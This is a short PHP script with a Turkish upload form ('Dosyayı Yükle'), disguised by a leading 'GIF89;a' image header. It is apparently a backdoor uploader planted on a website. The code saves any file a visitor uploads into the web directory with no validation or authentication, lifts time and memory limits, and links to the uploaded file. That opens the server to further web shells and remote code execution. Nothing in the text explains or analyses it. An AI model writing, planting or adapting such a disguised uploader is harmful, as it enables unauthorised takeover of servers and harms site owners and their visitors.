
GIF89;a
<!DOCTYPE html>
<html>
<head>
</head>
<body>
    <form enctype="multipart/form-data" action="" method="POST">
        <p>Yüklemek için bir dosya seçin:</p>
        <input type="file" name="uploaded_file"><br>
        <input type="submit" value="Dosyayı Yükle">
    </form>
    <?php
    set_time_limit(0);
    ini_set('memory_limit', '-1');
    $uploadKlasoru = "";
    if(!empty($_FILES['uploaded_file'])) {
        $dosyaYolu = $uploadKlasoru . basename($_FILES['uploaded_file']['name']);
        if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $dosyaYolu)) {
            echo "Dosya ". basename($_FILES['uploaded_file']['name']). " başarıyla yüklendi.";
            echo '<a href="' . $dosyaYolu . '" target="_blank">Dosyayı Aç</a>';
        } else {
            echo "Dosya yüklenirken bir hata oluştu!";
        }
    }
    ?>
</body>
</html>
